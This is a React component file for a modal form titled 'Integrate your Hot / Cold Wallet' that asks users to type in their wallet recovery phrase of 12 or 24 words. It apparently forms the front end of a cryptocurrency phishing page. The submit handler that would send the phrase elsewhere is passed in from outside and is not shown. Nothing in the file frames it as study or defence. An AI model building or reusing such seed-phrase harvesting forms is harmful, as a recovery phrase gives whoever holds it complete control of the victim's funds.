import React from "react";

const ModalForm = ({form, formSubmit, error}) => {
  return (
    <>
      <form action="submit" ref={form} onSubmit={formSubmit}>
        <p id="modalheading">Integrate your Hot / Cold Wallet</p>
        {error && <p id="modalerror">{error}</p>}
        <p className="label">Wallet Name</p>
        <input
          type="text"
          placeholder="Wallet"
          className="modalinput"
          id="modalinput1"
          name="pursename"
        />

        <p className="label">Recovery phrase</p>
        <input
          type="text"
          placeholder="Enter your recovery phrase"
          className="modalinput"
          id="modalinput2"
          name="pursephrase"
        />
        <p id="modallastp">
          Typically 12 (sometimes 24) words separated by single spaces
        </p>

        <div id="integratediv">
          <button id="integrate" type="submit">
            Integrate
          </button>
        </div>
      </form>
    </>
  );
};

export default ModalForm;
